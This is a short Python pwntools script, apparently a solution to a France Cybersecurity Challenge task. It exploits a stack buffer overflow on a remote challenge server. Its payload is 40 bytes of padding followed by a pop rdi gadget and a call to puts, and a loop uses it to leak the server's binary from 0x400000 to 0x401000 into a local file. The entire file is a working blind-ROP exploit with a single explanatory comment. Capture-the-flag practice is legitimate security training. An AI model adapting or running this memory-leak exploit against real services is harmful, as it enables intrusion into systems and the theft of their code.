import time

from pwn import *

"""
Once we have a control on a call puts with a `pop rdi` gadget
we leak the whole binary.
Starting from 0x400000 to 0x401000
"""

f = open("blind_binary", 'wb')

pop_rdi = 0x40073a+9
call_puts = 0x4006bd

leak = 0x400000
while leak <= 0x401000:
    print(hex(leak))
    time.sleep(0.5)
    io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
    io.recv(timeout=2)

    io.send(b'a' * 40 + p64(pop_rdi) + p64(leak) + p64(call_puts))

    received = io.recv(timeout=2)[50:-25]
    # If received nothing, it was a null byte stopping *puts*
    if received == b'':
        received = b'\x00'
    f.write(received)
    print(received)
    leak += len(received)

f.close()
